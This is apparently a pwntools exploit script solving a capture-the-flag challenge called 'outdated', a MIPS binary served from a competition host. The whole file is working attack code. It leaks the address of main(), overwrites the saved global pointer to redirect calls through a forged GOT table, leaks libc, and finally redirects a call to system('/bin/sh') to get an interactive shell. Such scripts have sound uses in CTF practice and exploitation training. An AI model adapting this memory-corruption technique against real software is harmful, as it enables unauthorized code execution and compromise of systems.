from pwn import *
from subprocess import getoutput


# initialize the binary
build = 'mipsel32r6-musl'
binary = "./outdated"
elf = context.binary = ELF(binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)
libc = ELF('./libc.so',checksec=False)

gs = """
set architecture mips:isa32r6
break *main+536
continue
"""

if args.REMOTE:
    p = remote("outdated.chals.sekai.team", 1337, ssl=True)
    
    ### SOLVE POW ###
    cmd = p.recvline().decode().strip().removeprefix("proof of work: ")
    print(f"Solving POW: {cmd}")
    answer = getoutput(cmd)
    p.sendlineafter(b"solution: ", answer.encode())
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','./:/target/ctf','-p','1234:1234',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/outdated'])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe=binary)
else:
    p = docker.process(['run','-i','--rm','-v','./:/target/ctf',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/outdated'])


### GET EXE LEAK ###
p.recvuntil(b'Here')
main_addr = int(p.recvline().strip().split(b' ')[-1],16)
print(f"main() = {hex(main_addr)}")


### GP OVERWRITE 1 ###
"""
(using example addresses)
old $gp = 0xf98000, puts() = $gp-0x7f84, exit() = $gp-0x7fac, thanks = $gp-0x7fd0
new $gp = 0xf98090, puts() = 0xf9010c, exit() = 0xf900e4, thanks = 0xf900c0 (game_name @ 0xf900c0)

Our goal is to turn puts("Thanks for playing") into puts_blue(GOT[puts])
and exit(0) into main(0)
"""
fake_got1 = flat(
    # 0xf900c0
    p32(main_addr + 0x1f6ac - 0x118c), p32(0), p32(0), p32(0), # GOT[puts] - main = 0x1f6ac (offset for "Thanks" string)
    
    # 0xf900d0
    p32(0), p32(0), p32(0), p32(0),
    
    # 0xf900e0
    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()
    
    # 0xf900f0
    p32(0), p32(0), p32(0), p32(0),

    # 0xf90100
    p32(0), p32(0), p32(0), p32(main_addr - 0x80), # offset from main() to puts_blue()
)
p.sendline(fake_got1)                                   # name (fake GOT in global)
p.sendline(b'-12')                                      # offset to stored $gp
p.sendline(b'32912')                                    # least significant 2 bytes of new $gp


### GET LIBC LEAK ###
p.recvuntil(b'in your game')
p.recvline()
puts_addr = int.from_bytes(p.recvline()[5:8], 'little')
print(f"puts() = {hex(puts_addr)}")
libc.address = puts_addr - libc.symbols['puts']


### GP OVERWRITE 2 ###
fake_got2 = flat(
    # 0xf900c0
    p32(next(libc.search(b'/bin/sh\0')) - 0x118c), p32(0), p32(0), p32(0), # "/bin/sh"
    
    # 0xf900d0
    p32(0), p32(0), p32(0), p32(0),
    
    # 0xf900e0
    p32(0), p32(main_addr), p32(0), p32(0), # address for main() so exit() jumps back into main()
    
    # 0xf900f0
    p32(0), p32(0), p32(0), p32(0),

    # 0xf90100
    p32(0), p32(0), p32(0), p32(libc.sym['system']), # system()
)
p.sendline(fake_got2)                                   # name (fake GOT in global)
p.sendline(b'-12')                                      # offset to stored $gp
p.sendline(b'32912')                                    # least significant 2 bytes of new $gp

p.interactive()
